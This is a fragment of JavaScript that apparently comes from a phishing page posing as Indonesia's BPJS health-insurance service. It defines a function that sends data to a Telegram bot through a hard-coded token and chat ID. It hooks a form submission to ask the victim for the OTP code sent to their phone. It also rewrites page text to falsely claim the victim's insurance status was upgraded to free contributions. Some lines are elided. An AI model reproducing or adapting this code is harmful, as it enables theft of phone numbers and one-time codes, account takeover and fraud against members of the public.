...
function sendToTelegram(message) {
  const token = "7884988749:AAFgVupRDZtfl8u3mOoE4Ltd7h9Sl-qC84o"; // Token bot Telegram Anda
  const chatId = "7727889444"; // Chat ID atau ID grup Anda
...
document
  ...
  .addEventListener("submit", function (event) {
    ...
    otpMessage.textContent = `Silakan Masukkan Kode OTP yang Dikirim ke Nomor ${phone}`;
...
document.querySelectorAll(".h2").forEach((item) => {
  item.textContent = item.textContent.replace(
    "RM1000",
    "Berhasil mengubah status kepesertaan BPJS menjadi BPJS dengan iuran gratis."
  );
});
